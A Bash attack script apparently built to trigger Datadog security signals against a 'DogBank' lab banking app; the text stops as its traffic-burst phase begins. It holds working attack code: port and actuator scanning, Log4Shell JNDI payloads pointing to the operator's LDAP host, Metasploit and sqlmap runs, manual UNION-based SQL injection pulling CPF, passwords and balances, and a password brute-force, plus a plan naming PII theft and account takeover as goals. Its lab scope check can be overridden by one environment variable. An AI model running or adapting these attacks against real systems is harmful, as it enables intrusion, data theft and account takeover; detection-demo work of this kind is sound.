#!/bin/bash
# EvilDog — Script Kiddie Scanner v3.0
# Apocalypse Ghost Dog Edition

MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
[ -z "$MY_IP" ] && command -v ip >/dev/null 2>&1 && MY_IP=$(ip addr show 2>/dev/null | grep "inet " | grep -v 127 | awk '{print $2}' | cut -d/ -f1 | head -1)
[ -z "$MY_IP" ] && command -v ifconfig >/dev/null 2>&1 && MY_IP=$(ifconfig 2>/dev/null | awk '/inet / && $2 != "127.0.0.1" {print $2; exit}')
[ -z "$MY_IP" ] && MY_IP="127.0.0.1"
OUT=~/evildog-results
RUN_ID=$(date '+%Y%m%d-%H%M%S')
CURL_CONNECT_TIMEOUT="${CURL_CONNECT_TIMEOUT:-3}"
CURL_MAX_TIME="${CURL_MAX_TIME:-10}"
NMAP_TIMEOUT="${NMAP_TIMEOUT:-45}"
SQLMAP_TIMEOUT="${SQLMAP_TIMEOUT:-75}"
MSF_TIMEOUT="${MSF_TIMEOUT:-45}"
TRAFFIC_BURST_SECONDS="${TRAFFIC_BURST_SECONDS:-20}"
TRAFFIC_BURST_CONCURRENCY="${TRAFFIC_BURST_CONCURRENCY:-10}"
TRAFFIC_BURST_REQUESTS="${TRAFFIC_BURST_REQUESTS:-1000}"
TRAFFIC_BURST_MAX_REQUESTS="${TRAFFIC_BURST_MAX_REQUESTS:-1000}"
mkdir -p "$OUT"
RECON_PLAN_FILE="$OUT/evildog-recon-$RUN_ID.json"
LATEST_RECON_PLAN="$OUT/latest-recon-plan.json"
ACTUATOR_EXPOSED_FILE="$OUT/actuator-exposed-$RUN_ID.txt"
: > "$ACTUATOR_EXPOSED_FILE"

RED='\033[1;38;5;196m'
GREEN='\033[1;38;5;46m'
YELLOW='\033[1;38;5;226m'
CYAN='\033[1;38;5;51m'
MAGENTA='\033[1;38;5;201m'
WHITE='\033[1;37m'
DIM='\033[2;37m'
NC='\033[0m'
BOLD='\033[1m'
BLINK='\033[5m'

VULNS=(); TOTAL_CRITICAL=0; TOTAL_HIGH=0; TOTAL_MEDIUM=0; TOTAL_INFO=0
START_TIME=$SECONDS
PHASE_TOTAL=7
PHASE_COUNT=0
PHASE_LABEL=""
PHASE_START=$SECONDS
PHASE_TIMELINE=()
HTTP_REQUEST_COUNT=0

add_vuln() {
  local sev=$1 name=$2 detail=$3 cve=${4:-"N/A"} url=${5:-""}
  VULNS+=("$sev|$name|$detail|$cve|$url")
  case $sev in
    CRITICAL) TOTAL_CRITICAL=$((TOTAL_CRITICAL+1)) ;;
    HIGH)     TOTAL_HIGH=$((TOTAL_HIGH+1)) ;;
    MEDIUM)   TOTAL_MEDIUM=$((TOTAL_MEDIUM+1)) ;;
    INFO)     TOTAL_INFO=$((TOTAL_INFO+1)) ;;
  esac
}

fmt_duration() {
  local total=${1:-0}
  printf "%dm%02ds" "$((total / 60))" "$((total % 60))"
}

phase_start() {
  PHASE_COUNT=$((PHASE_COUNT+1))
  PHASE_LABEL="$1"
  PHASE_START=$SECONDS
  printf "  ${DIM}│${NC}  ${CYAN}timer:${NC} phase ${YELLOW}%d/%d${NC} started — ${WHITE}%s${NC}\n" "$PHASE_COUNT" "$PHASE_TOTAL" "$PHASE_LABEL"
}

phase_end() {
  local elapsed=$((SECONDS - PHASE_START))
  PHASE_TIMELINE+=("$PHASE_LABEL|$elapsed")
  printf "  ${DIM}│${NC}  ${GREEN}✓${NC} phase done in ${WHITE}%s${NC} — total ${DIM}%s${NC}\n" "$(fmt_duration "$elapsed")" "$(fmt_duration "$((SECONDS - START_TIME))")"
}

run_limited() {
  local limit=$1
  shift
  if command -v timeout >/dev/null 2>&1; then
    timeout "$limit" "$@"
  else
    "$@"
  fi
}

clamp_int() {
  local value=$1 max=$2 fallback=$3
  case "$value" in
    ''|*[!0-9]*) printf "%s" "$fallback"; return ;;
  esac
  if [ "$value" -gt "$max" ] && [ "${EVILDOG_ALLOW_HEAVY_LOAD:-0}" != "1" ]; then
    printf "%s" "$max"
  else
    printf "%s" "$value"
  fi
}

guard_scope() {
  case "$TARGET" in
    lab.dogbank.dog|localhost|127.0.0.1|host.docker.internal|*.local)
      return 0
      ;;
    *)
      [ "${EVILDOG_ALLOW_NON_LAB:-0}" = "1" ] && return 0
      printf "  ${YELLOW}Target fora do lab autorizado: %s${NC}\n" "$TARGET"
      printf "  ${DIM}Defina EVILDOG_ALLOW_NON_LAB=1 apenas para ambiente proprio/autorizado.${NC}\n"
      exit 1
      ;;
  esac
}

log()          { printf "  ${DIM}│${NC}  → $1\n"; }
log_found()    { printf "  ${DIM}│${NC}  ${RED}${BOLD}👻 FOUND:${NC} ${YELLOW}$1${NC}\n"; }
log_ok()       { printf "  ${DIM}│${NC}  ${GREEN}✓${NC} $1\n"; }
log_warn()     { printf "  ${DIM}│${NC}  ${YELLOW}⚠${NC} $1\n"; }
log_critical() { printf "  ${DIM}│${NC}  ${RED}${BOLD}🚨${NC} $1\n"; }
log_loot()     { printf "  ${DIM}│${NC}  ${YELLOW}${BOLD}💰 LOOT:${NC} ${WHITE}$1${NC}\n"; }

PANEL_W=62

repeat_char() {
  local char=$1 count=$2 out=""
  for ((i=0; i<count; i++)); do out="${out}${char}"; done
  printf "%s" "$out"
}

panel_top() {
  local color=${1:-$RED}
  printf "  ${color}${BOLD}╔"; repeat_char "═" $((PANEL_W + 2)); printf "╗${NC}\n"
}

panel_sep() {
  local color=${1:-$RED}
  printf "  ${color}${BOLD}╠"; repeat_char "═" $((PANEL_W + 2)); printf "╣${NC}\n"
}

panel_bottom() {
  local color=${1:-$RED}
  printf "  ${color}${BOLD}╚"; repeat_char "═" $((PANEL_W + 2)); printf "╝${NC}\n"
}

panel_line() {
  local color=${1:-$RED} text=${2:-}
  if [ ${#text} -gt $PANEL_W ]; then
    text="${text:0:$((PANEL_W - 3))}..."
  fi
  printf "  ${color}${BOLD}║${NC} %-*s ${color}${BOLD}║${NC}\n" "$PANEL_W" "$text"
}

phase_bar() {
  local current=${1:-0} total=${2:-7} bar=""
  current=$((10#$current))
  for ((i=1; i<=total; i++)); do
    if [ $i -le $current ]; then bar="${bar}█"; else bar="${bar}░"; fi
  done
  printf "  ${DIM}attack chain${NC} ${RED}${bar}${NC} ${YELLOW}%02d/%02d${NC}\n" "$current" "$total"
}

print_attack_map() {
  panel_top "$CYAN"
  panel_line "$CYAN" "EVILDOG RECON HUD"
  panel_sep "$CYAN"
  panel_line "$CYAN" "01 Portas e serviços expostos        -> Nmap evidence"
  panel_line "$CYAN" "02 Headers e hardening HTTP          -> Misconfig evidence"
  panel_line "$CYAN" "03 Actuator Spring Boot              -> Sensitive exposure"
  panel_line "$CYAN" "04 Log4Shell payloads                -> Datadog ASM signal"
  panel_line "$CYAN" "05 SQL injection probe               -> Datadog ASM signal"
  panel_line "$CYAN" "06 Brute force / weak credentials    -> Datadog ASM signal"
  panel_line "$CYAN" "07 Traffic burst controlado          -> SIEM/AppSec signal"
  panel_bottom "$CYAN"
  printf "\n"
}

datadog_cue() {
  local signal filter next
  signal=${1:-}
  filter=${2:-}
  next=${3:-"Abra o signal e correlacione trace + logs"}
  printf "\n"
  panel_top "$MAGENTA"
  panel_line "$MAGENTA" "DATADOG LIVE CHECK"
  panel_sep "$MAGENTA"
  panel_line "$MAGENTA" "Signal esperado : $signal"
  panel_line "$MAGENTA" "Caminho          : Security > Application Security > Signals"
  panel_line "$MAGENTA" "Filtro sugerido  : $filter"
  panel_line "$MAGENTA" "Narrativa        : $next"
  panel_bottom "$MAGENTA"
}

write_recon_plan() {
  local vuln_file="$OUT/recon-vulns-$RUN_ID.tsv"
  : > "$vuln_file"
  for vuln in "${VULNS[@]}"; do
    printf "%s\n" "$vuln" >> "$vuln_file"
  done

  python3 - "$RECON_PLAN_FILE" "$RUN_ID" "$TARGET" "$MY_IP" "$OUT" "$vuln_file" "$ACTUATOR_EXPOSED_FILE" "$REQUESTS" "$CONCURRENCY" <<'PY'
import json
import pathlib
import sys
from datetime import datetime, timezone

plan_path, run_id, target, operator_ip, out_dir, vuln_file, actuator_file, requests, concurrency = sys.argv[1:]
out = pathlib.Path(out_dir).expanduser()

def read_text(path):
    try:
        return pathlib.Path(path).read_text(encoding="utf-8", errors="replace")
    except Exception:
        return ""

def parse_vulns(path):
    findings = []
    for line in read_text(path).splitlines():
        parts = line.split("|")
        if len(parts) < 5:
            continue
        findings.append({
            "severity": parts[0],
            "name": parts[1],
            "detail": parts[2],
            "cve_or_cwe": parts[3],
            "reference": parts[4],
        })
    return findings

def parse_actuators(path):
    exposed = []
    for line in read_text(path).splitlines():
        parts = line.split("|")
        if len(parts) >= 3:
            exposed.append({"path": parts[0], "status": parts[1], "bytes": parts[2]})
    return exposed

def parse_ports(nmap_text):
    ports = []
    for line in nmap_text.splitlines():
        if " open " not in line:
            continue
        cols = line.split()
        if len(cols) >= 3:
            ports.append({"port": cols[0], "state": cols[1], "service": " ".join(cols[2:])})
    return ports

requests = requests if requests.isdigit() else "1000"
concurrency = concurrency if concurrency.isdigit() else "10"
nmap_path = out / "nmap.txt"
headers_path = out / "headers.txt"

plan = {
    "schema": "evildog.recon.v1",
    "run_id": run_id,
    "generated_at": datetime.now(timezone.utc).isoformat(),
    "target": target,
    "target_url": f"https://{target}",
    "operator_ip": operator_ip,
    "scope": "DogBank Lab autorizado",
    "evidence": {
        "nmap": str(nmap_path),
        "headers": str(headers_path),
        "actuator_exposed": str(pathlib.Path(actuator_file).expanduser()),
    },
    "observed": {
        "open_ports": parse_ports(read_text(nmap_path)),
        "exposed_actuators": parse_actuators(actuator_file),
    },
    "findings": parse_vulns(vuln_file),
    "exploit_plan": {
        "sqli": {
            "id": "dogbank-sqli-pixkey",
            "cve_or_cwe": "CWE-89",
            "tool": "sqlmap",
            "endpoint": "/api/transactions/validate-pix-key",
            "parameter": "pixKey",
            "url_template": f"https://{target}/api/transactions/validate-pix-key?pixKey=*",
            "payloads": [
                "' OR '1'='1' --",
                "' UNION SELECT u.nome, u.email, u.cpf, c.saldo::text, c.banco, u.chave_pix FROM usuarios u JOIN contas c ON u.id=c.usuario_id--",
                "'; SELECT pg_sleep(2);--",
            ],
            "objective": "extrair PII, saldo e chave PIX",
        },
        "log4shell": {
            "id": "dogbank-log4shell-auth-header",
            "cve_or_cwe": "CVE-2021-44228",
            "tool": "msfconsole",
            "module": "exploit/multi/http/log4shell_header_injection",
            "endpoint": "/api/auth/lab/log4shell",
            "headers": ["User-Agent", "X-Api-Version", "X-Forwarded-For", "Referer"],
            "payload_template": "${jndi:ldap://ATTACKER:389/evildog}",
            "objective": "RCE e acesso a variaveis de ambiente/secrets",
        },
        "credential_attack": {
            "id": "dogbank-credential-crack",
            "cve_or_cwe": "CWE-307/CWE-521",
            "tool": "hydra_or_curl_json",
            "endpoint": "/api/auth/login",
            "username_field": "cpf",
            "password_field": "senha",
            "target_cpf": "12345678915",
            "objective": "account takeover e prova de PIX",
        },
        "traffic_burst": {
            "id": "dogbank-rate-abuse",
            "mitre": "T1499",
            "tool": "ab",
            "endpoint": "/api/auth/login",
            "requests": int(requests),
            "concurrency": int(concurrency),
            "objective": "gerar volume controlado para SIEM/AppSec",
        },
    },
}

pathlib.Path(plan_path).write_text(json.dumps(plan, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
PY
  cp "$RECON_PLAN_FILE" "$LATEST_RECON_PLAN" 2>/dev/null || true
}

simple_intro() {
  clear
  print_banner
  printf "  ${CYAN}👻${NC} ${WHITE}Recon visual pronto${NC}  ${DIM}• DogBank Lab • Datadog ASM demo${NC}\n\n"
}

status_pause() {
  local msg=$1 duration=${2:-2}
  spin_line "$msg" "$duration"
}

# ─────────────────────────────────────────────────────────────
# STATUS SPINNER — roda em-linha (não limpa tela, cursor save/restore)
# Usado durante execução das ferramentas — nunca trava a tela
# ─────────────────────────────────────────────────────────────
reaper_spin() {
  local msg=$1 duration=${2:-4} end frame=0
  local frames=("👻" "🐕" "🕵️" "🔎")
  end=$((SECONDS + duration))
  while [ $SECONDS -lt $end ]; do
    printf "\r  ${RED}${BOLD}%s${NC} ${WHITE}%-38s${NC} ${DIM}%02ds${NC}   " "${frames[$((frame % ${#frames[@]}))]}" "$msg" "$((end - SECONDS))"
    frame=$((frame+1))
    sleep 0.18
  done
  printf "\r%-90s\r" " "
}

spin_line() {
  local msg=$1 duration=${2:-2} end i=0
  end=$((SECONDS + duration))
  local F=("👻 █████▒▒▒░░░" "🐕 ░█████▒▒▒░░" "🕵️ ░░█████▒▒▒░" "🔎 ▒░░█████▒▒")
  while [ $SECONDS -lt $end ]; do
    printf "\r  ${RED}${BOLD}${F[$((i % ${#F[@]}))]}${NC}  ${DIM}$msg${NC}   "
    sleep 0.15; i=$((i+1))
  done
  printf "\r%-80s\r" " "
}

draw_progress_bar() {
  local current=$1 total=$2 label=$3
  local pct=$((current * 100 / total)) filled=$((current * 30 / total))
  printf "\r  ${GREEN}👻${NC} ["
  for ((i=0; i<30; i++)); do
    if [ $i -lt $filled ]; then printf "${RED}█${NC}"
    elif [ $i -eq $filled ]; then printf "${YELLOW}▓${NC}"
    else printf "${DIM}░${NC}"; fi
  done
  printf "] ${YELLOW}%3d%%${NC}  ${DIM}%s${NC}   " "$pct" "$label"
}

print_banner() {
  printf "${GREEN}${BOLD}"
  cat << 'EOF'
  ███████╗██╗   ██╗██╗██╗      ██████╗  ██████╗  ██████╗
  ██╔════╝██║   ██║██║██║      ██╔══██╗██╔═══██╗██╔════╝
  █████╗  ██║   ██║██║██║      ██║  ██║██║   ██║██║  ███╗
  ██╔══╝  ╚██╗ ██╔╝██║██║      ██║  ██║██║   ██║██║   ██║
  ███████╗ ╚████╔╝ ██║███████╗ ██████╔╝╚██████╔╝╚██████╔╝
  ╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝
EOF
  printf "${NC}\n"
  printf "${DIM}              👻 🐕 🕵️  DogBank Security Recon${NC}\n\n"
}

section() {
  local num=$1 title=$2 tool=$3
  printf "\n${RED}${BOLD}"
  printf "╔══════════════════════════════════════════════════════════════╗\n"
  printf "║ ${GREEN}PHASE %02d/07${RED}  %-47s ${RED}║\n" "$num" "$title"
  printf "║ ${YELLOW}Tool: %-54s ${RED}║\n" "$tool"
  printf "╚══════════════════════════════════════════════════════════════╝\n"
  printf "${NC}"
  phase_bar "$num" 7
  printf "${DIM}  ┌──────────────────────────────────────────────────────────────\n${NC}"
}
section_end() {
  printf "${DIM}  └──────────────────────────────────────────────────────────────\n${NC}"
}

# ══════════════════════════════════════════════════════════════
# ABERTURA
# ══════════════════════════════════════════════════════════════
simple_intro

printf "${RED}${BOLD}"
printf "╔══════════════════════════════════════════════════════════════╗\n"
printf "║ ${GREEN}👻  SELECT TARGET${NC}${RED}                                         ║\n"
printf "║                                                              ║\n"
printf "║   ${CYAN}[1]${NC}${RED} lab.dogbank.dog  ${DIM}(DogBank Lab — AWS EKS)${RED}         ║\n"
printf "║   ${CYAN}[2]${NC}${RED} Manual input${NC}${RED}                                    ║\n"
printf "║                                                              ║\n"
printf "╚══════════════════════════════════════════════════════════════╝\n"
printf "${NC}\n"
printf "  ${RED}👻${NC} ${YELLOW}Choose [1/2]:${NC} "; read -r CHOICE

if [ "$CHOICE" = "2" ]; then
  printf "  ${RED}👻${NC} ${YELLOW}Target (without https://):${NC} "; read -r TARGET
  TARGET=$(echo "$TARGET" | sed 's|https://||;s|http://||;s|/.*||')
else
  TARGET="lab.dogbank.dog"
fi
guard_scope

status_pause "preparando contexto da demo..." 2

clear; print_banner
printf "  ${RED}${BOLD}┌────────────────────────────────────────────────────────────┐${NC}\n"
printf "  ${RED}${BOLD}│${NC}  ${YELLOW}TARGET  ${NC} ${GREEN}%-48s${NC}${RED}${BOLD}│${NC}\n" "https://$TARGET"
printf "  ${RED}${BOLD}│${NC}  ${YELLOW}ATTACKER${NC} ${GREEN}%-48s${NC}${RED}${BOLD}│${NC}\n" "$MY_IP"
printf "  ${RED}${BOLD}│${NC}  ${YELLOW}STARTED ${NC} ${GREEN}%-48s${NC}${RED}${BOLD}│${NC}\n" "$(date '+%Y-%m-%d %H:%M:%S')"
printf "  ${RED}${BOLD}│${NC}  ${YELLOW}OUTPUT  ${NC} ${GREEN}%-48s${NC}${RED}${BOLD}│${NC}\n" "$OUT/"
printf "  ${RED}${BOLD}└────────────────────────────────────────────────────────────┘${NC}\n\n"

print_attack_map

printf "  ${CYAN}🕵️${NC} ${WHITE}Recon iniciado${NC} ${DIM}• acompanhe os sinais no Datadog ASM${NC}\n\n"
sleep 0.5

# ══════════════════════════════════════════════════════════════
# 01. PORT SCAN
# ══════════════════════════════════════════════════════════════
section 1 "PORT SCAN & SERVICE DETECTION" "nmap -sV --open"
phase_start "port-scan-service-detection"
log "Resolving DNS for $TARGET..."
log "Starting TCP SYN scan on ports 80, 443, 8080, 8088, 8089, 9090..."
log "Detecting service versions..."

reaper_spin "nmap scanning ports..." 6 &
RPID=$!
NMAP_OUT=$(run_limited "$NMAP_TIMEOUT" nmap -sV --host-timeout 30s --open -p 80,443,8080,8088,8089,9090 "$TARGET" 2>/dev/null)
NMAP_RC=$?
kill $RPID 2>/dev/null; wait $RPID 2>/dev/null
echo "$NMAP_OUT" > "$OUT/nmap.txt"
if [ "$NMAP_RC" = "124" ]; then
  log_warn "nmap atingiu timeout de ${NMAP_TIMEOUT}s — seguindo com o que foi coletado"
fi

IP=$(echo "$NMAP_OUT" | grep "report for" | awk '{print $NF}' | tr -d '()')
OPEN_COUNT=$(echo "$NMAP_OUT" | grep -c "open" || echo 0)

echo "$NMAP_OUT" | grep "open" | while read -r line; do
  PORT=$(echo "$line" | awk '{print $1}')
  SVC=$(echo "$line" | awk '{print $3" "$4" "$5}')
  log_found "Port $PORT — $SVC"
done
[ -n "$IP" ] && log "Resolved IP: ${WHITE}$IP${NC}"
log "$OPEN_COUNT open port(s) found"
add_vuln "INFO" "Open Ports Found" "$OPEN_COUNT ports exposed" "CWE-200" "https://cwe.mitre.org/data/definitions/200.html"
phase_end
section_end

# ══════════════════════════════════════════════════════════════
# 02. SECURITY HEADERS
# ══════════════════════════════════════════════════════════════
section 2 "SECURITY HEADERS ANALYSIS" "curl -I"
phase_start "security-headers-analysis"
log "Fetching HTTP headers from https://$TARGET ..."

spin_line "collecting headers..." 2 &
SP=$!
HTTP_REQUEST_COUNT=$((HTTP_REQUEST_COUNT+1))
curl -sk --connect-timeout "$CURL_CONNECT_TIMEOUT" --max-time "$CURL_MAX_TIME" -I "https://$TARGET" > "$OUT/headers.txt" 2>&1
kill $SP 2>/dev/null; wait $SP 2>/dev/null

SERVER=$(grep -i "^server:" "$OUT/headers.txt" | cut -d' ' -f2-)
[ -n "$SERVER" ] && log "Server identified: ${WHITE}$SERVER${NC}"

for h in "Strict-Transport-Security" "Content-Security-Policy" "X-Frame-Options" "X-Content-Type-Options" "X-XSS-Protection"; do
  if grep -qi "$h" "$OUT/headers.txt"; then
    log_ok "$h present"
  else
    log_found "$h MISSING — application unprotected"
    add_vuln "HIGH" "Missing Security Header" "$h not configured" "CWE-693" "https://owasp.org/www-project-secure-headers/"
  fi
done
phase_end
section_end

# ══════════════════════════════════════════════════════════════
# 03. SPRING BOOT ACTUATOR
# ══════════════════════════════════════════════════════════════
section 3 "SPRING BOOT ACTUATOR EXPOSURE" "curl (9 endpoints)"
phase_start "spring-boot-actuator-exposure"
log "Testing internal Spring Boot management endpoints..."
log "Exposed actuator = access to env vars, heap dump, JVM internals..."

ENDPOINTS_ACT=("" "/health" "/info" "/env" "/metrics" "/heapdump" "/beans" "/mappings" "/loggers")
TOTAL=${#ENDPOINTS_ACT[@]}; DONE=0

for ep in "${ENDPOINTS_ACT[@]}"; do
  DONE=$((DONE+1))
  HTTP_REQUEST_COUNT=$((HTTP_REQUEST_COUNT+1))
  CODE=$(curl -sk --connect-timeout "$CURL_CONNECT_TIMEOUT" --max-time "$CURL_MAX_TIME" -o /tmp/_act_resp.txt -w "%{http_code}" "https://$TARGET/actuator$ep")
  SIZE=$(wc -c < /tmp/_act_resp.txt 2>/dev/null || echo 0)
  draw_progress_bar $DONE $TOTAL "/actuator$ep → HTTP $CODE"
  sleep 0.15
  if [ "$CODE" = "200" ]; then
    printf "\r%-80s\r" " "
    log_found "/actuator$ep → HTTP $CODE ($SIZE bytes) — EXPOSED!"
    printf "/actuator%s|%s|%s\n" "$ep" "$CODE" "$SIZE" >> "$ACTUATOR_EXPOSED_FILE"
    add_vuln "CRITICAL" "Spring Boot Actuator Exposed" "/actuator$ep public" "CWE-200" "https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"
  elif [ "$CODE" = "401" ] || [ "$CODE" = "403" ]; then
    printf "\r%-80s\r" " "
    log_ok "/actuator$ep → HTTP $CODE (protected)"
  fi
done
printf "\r%-80s\r" " "
phase_end
section_end

# ══════════════════════════════════════════════════════════════
# 04. LOG4SHELL CVE-2021-44228
# ══════════════════════════════════════════════════════════════
section 4 "LOG4SHELL — CVE-2021-44228  CVSS 10.0" "metasploit + curl"
phase_start "log4shell-probes"
log "CVE-2021-44228 — Apache Log4j Remote Code Execution (CVSS 10.0)"
log "Payload: \${jndi:ldap://ATTACKER/exploit} injected via HTTP headers"
log "Loading: auxiliary/scanner/http/log4shell_scanner"
log "SRVHOST=$MY_IP  RHOST=$TARGET  RPORT=443  SSL=true"
printf "\n"

reaper_spin "metasploit log4shell scanner running..." 12 &
RPID=$!
MSF_OUT=$(run_limited "$MSF_TIMEOUT" msfconsole -q -x "
use auxiliary/scanner/http/log4shell_scanner;
set RHOSTS $TARGET; set RPORT 443; set SSL true;
  set SRVHOST $MY_IP; set TARGETURI /api/auth/lab/log4shell;
set HTTP_METHOD POST; set THREADS 1;
run; exit" 2>/dev/null)
MSF_RC=$?
kill $RPID 2>/dev/null; wait $RPID 2>/dev/null
echo "$MSF_OUT" > "$OUT/log4shell_msf.txt"

if [ "$MSF_RC" = "124" ]; then
  log_warn "metasploit atingiu timeout de ${MSF_TIMEOUT}s — seguindo com payloads manuais"
else
  log "Metasploit done — parsing output..."
fi
echo "$MSF_OUT" | grep -E "\[\+\]|\[!\]|\[\*\]" | head -6 | while read -r l; do
  echo "$l" | grep -q "\[+\]" && log_found "$l" || log "$l"
done

log "Injecting JNDI payloads manually in multiple headers..."
PAYLOAD="\${jndi:ldap://$MY_IP:389/evildog}"
HEADERS_LIST=("User-Agent" "X-Forwarded-For" "X-Api-Version" "X-Real-IP" "Referer" "CF-Connecting-IP")
ENDPOINTS_L=("/api/auth/lab/log4shell" "/api/auth/login" "/api/transactions/pix")
TOTAL=$(( ${#HEADERS_LIST[@]} * ${#ENDPOINTS_L[@]} )); DONE=0

for endpoint in "${ENDPOINTS_L[@]}"; do
  for header in "${HEADERS_LIST[@]}"; do
    DONE=$((DONE+1))
    draw_progress_bar $DONE $TOTAL "$header → $endpoint"
    HTTP_REQUEST_COUNT=$((HTTP_REQUEST_COUNT+1))
    curl -sk --connect-timeout "$CURL_CONNECT_TIMEOUT" --max-time "$CURL_MAX_TIME" -o /dev/null \
      -H "$header: $PAYLOAD" \
      -H "X-EvilDog-Run: $RUN_ID" \
      -H "Content-Type: application/json" \
      -d '{"cpf":"test","senha":"test"}' \
      "https://$TARGET$endpoint" 2>/dev/null
    sleep 0.12
  done
done
printf "\r%-80s\r" " "
log_critical "$DONE JNDI payloads fired — check Datadog ASM for signals"
add_vuln "CRITICAL" "Log4Shell CVE-2021-44228" "$DONE payloads via $((${#HEADERS_LIST[@]})) headers × $((${#ENDPOINTS_L[@]})) endpoints" "CVE-2021-44228" "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
datadog_cue "Log4Shell Exploit Attempt" "CVE-2021-44228 OR jndi" "Mostre o payload no request header e o trace afetado"
phase_end
section_end

# ══════════════════════════════════════════════════════════════
# 05. SQL INJECTION
# ══════════════════════════════════════════════════════════════
section 5 "SQL INJECTION" "sqlmap --level=2 --risk=1"
phase_start "sql-injection-probes"
log "Testing query parameter 'pixKey' on PIX validation endpoint"
log "Techniques: Boolean-based, Time-based, Error-based, UNION-based"
log "GET https://$TARGET/api/transactions/validate-pix-key?pixKey=*"
printf "\n"

reaper_spin "sqlmap injecting SQL payloads..." 10 &
RPID=$!
SQLI_OUT=$(run_limited "$SQLMAP_TIMEOUT" sqlmap -u "https://$TARGET/api/transactions/validate-pix-key?pixKey=*" \
  -H "Content-Type: application/json" \
  --user-agent="sqlmap/1.8 EvilDog/$RUN_ID" \
  --headers="X-EvilDog-Run: $RUN_ID" \
  --level=2 --risk=1 --batch --silent \
  --output-dir="$OUT/sqlmap" 2>&1)
SQLMAP_RC=$?
kill $RPID 2>/dev/null; wait $RPID 2>/dev/null
echo "$SQLI_OUT" > "$OUT/sqli.txt"

if [ "$SQLMAP_RC" = "124" ]; then
  log_warn "sqlmap atingiu timeout de ${SQLMAP_TIMEOUT}s — seguindo com payload manual"
else
  log "sqlmap done — parsing results..."
fi
echo "$SQLI_OUT" | grep -E "injectable|vulnerable|Type:|Title:|Payload:|backend" | head -8 | while read -r l; do
  log_found "$l"
done

log "Sending manual SQLi probes against PIX validation flow..."
SQLI_PAYLOADS=("' OR '1'='1' --" "1 UNION SELECT cpf,senha,balance FROM usuarios--" "'; SELECT pg_sleep(2);--")
for payload in "${SQLI_PAYLOADS[@]}"; do
  PAYLOAD_ENC=$(python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "$payload")
  HTTP_REQUEST_COUNT=$((HTTP_REQUEST_COUNT+1))
  curl -sk --connect-timeout "$CURL_CONNECT_TIMEOUT" --max-time "$CURL_MAX_TIME" -o /dev/null \
    -A "EvilDog-SQLi/$RUN_ID" \
    -H "X-EvilDog-Run: $RUN_ID" \
    "https://$TARGET/api/transactions/validate-pix-key?pixKey=$PAYLOAD_ENC" 2>/dev/null
done

if echo "$SQLI_OUT" | grep -qi "injectable\|is vulnerable"; then
  log_critical "SQL INJECTION CONFIRMED on parameter cpf!"
  add_vuln "CRITICAL" "SQL Injection Confirmed" "cpf parameter injectable — full DB accessible" "CWE-89 / OWASP A03" "https://owasp.org/www-community/attacks/SQL_Injection"
else
  log_warn "Inconclusive — payload sent, check $OUT/sqli.txt"
  add_vuln "HIGH" "SQL Injection Probe Sent" "Manual verification recommended" "CWE-89" "https://cwe.mitre.org/data/definitions/89.html"
fi
datadog_cue "SQL Injection Attack" "@appsec.security_activity:attack_attempt.sql_injection OR /api/transactions/validate-pix-key" "Mostre HTTP 200 no validate-pix-key e records_leaked"
phase_end
section_end

# ══════════════════════════════════════════════════════════════
# 06. BRUTE FORCE
# ══════════════════════════════════════════════════════════════
section 6 "BRUTE FORCE LOGIN" "curl (10 attempts)"
phase_start "brute-force-login"
log "Testing endpoint resistance to common passwords"
log "Target: POST https://$TARGET/api/auth/login"
log "CPF: 12345678915 — checking for rate limiting..."
printf "\n"

PASSWORDS=("senha" "password" "dogbank" "12345678" "123456" "qwerty" "dog1234" "mudar123" "123mudar" "senha123")
CPF="12345678915"
FOUND_PASS=""; RATE_LIMITED=false; ATTEMPT=0; TOTAL=${#PASSWORDS[@]}

for pass in "${PASSWORDS[@]}"; do
  ATTEMPT=$((ATTEMPT+1))
  log "Attempt $ATTEMPT/$TOTAL  CPF: ${WHITE}$CPF${NC}  Password: ${WHITE}$pass${NC}"
  draw_progress_bar $ATTEMPT $TOTAL "testing: $pass"

  HTTP_REQUEST_COUNT=$((HTTP_REQUEST_COUNT+1))
  RESP=$(curl -sk --connect-timeout "$CURL_CONNECT_TIMEOUT" --max-time "$CURL_MAX_TIME" -w "\n%{http_code}" \
    -A "EvilDog-Bruteforce/$RUN_ID" \
    -H "Content-Type: application/json" \
    -H "X-EvilDog-Run: $RUN_ID" \
    -d "{\"cpf\":\"$CPF\",\"senha\":\"$pass\"}" \
    "https://$TARGET/api/auth/login" 2>/dev/null)
  CODE=$(echo "$RESP" | tail -1)
  BODY=$(echo "$RESP" | head -1)
  printf "\r%-80s\r" " "

  if [ "$CODE" = "429" ] || echo "$BODY" | grep -qi "bloqueado\|blocked\|rate.limit\|muitas"; then
    log_ok "Rate limit active — blocked after $ATTEMPT attempts"
    add_vuln "INFO" "Rate Limiting Active" "Blocked after $ATTEMPT attempts" "CWE-307" "https://cwe.mitre.org/data/definitions/307.html"
    RATE_LIMITED=true; break
  elif [ "$CODE" = "200" ] && echo "$BODY" | grep -qi "token\|Bearer\|jwt\|access"; then
    log_loot "LOGIN SUCCESS! CPF=$CPF PASSWORD=$pass (HTTP $CODE)"
    add_vuln "CRITICAL" "Weak Credentials Found" "$CPF / $pass — account compromised" "CWE-521 / OWASP A07" "https://owasp.org/www-project-top-ten/2021/A07_2021-Identification_and_Authentication_Failures"
    FOUND_PASS=$pass; break
  else
    log "HTTP $CODE — wrong password"
  fi
  sleep 0.2
done

[ -z "$FOUND_PASS" ] && [ "$RATE_LIMITED" = false ] && {
  log_warn "No rate limit — endpoint accepts unlimited attempts"
  add_vuln "HIGH" "No Rate Limiting" "Unlimited login attempts allowed" "CWE-307" "https://cwe.mitre.org/data/definitions/307.html"
}
datadog_cue "Credential Stuffing / Brute Force" "@appsec.security_activity:business_logic.users.login.failure OR @appsec.security_activity:business_logic.users.login.success" "Mostre falhas de login, sucesso eventual e rate limiter"
phase_end
section_end

# ══════════════════════════════════════════════════════════════
# 07. CONTROLLED TRAFFIC BURST
# ══════════════════════════════════════════════════════════════
section 7 "CONTROLLED TRAFFIC BURST / DOS SIGNAL" "ab/siege/curl capped"
phase_start "controlled-traffic-burst"
log "Generating controlled traffic spike for SIEM/AppSec demo."
log "This is capped lab traffic, not a destructive flood."

